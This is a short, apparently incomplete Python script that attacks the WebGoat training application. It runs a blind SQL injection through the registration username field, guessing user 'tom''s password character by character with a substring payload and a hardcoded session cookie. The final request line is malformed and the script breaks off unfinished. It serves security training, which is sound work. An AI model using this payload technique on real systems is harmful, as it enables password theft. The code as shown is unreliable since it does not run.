import json
import requests

def sql_injection_advance_5():
    alphabet = 'qwertyuioplkjhgfdsamnbvcxz'
    alphabet_index = 0
    password_index = 0
    password = ''
    
    headers = {
        'Cookie' : "JSESSIONID=RHYM4569z5nWmVPpa2y2tdhgjmsw-P3-4gIvdweS",
    }
    
    while True:
        payload = 'tom\' AND substring(password, {}, 1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])
        
        data = {
            'username_reg' : payload,
            'email_reg': 'a@a',
            'password_reg':'a',
            'confirm_password_reg': 'a'
        }
        
        r = requests .put('http://192.168.8.124:8080/WebGoat/')
    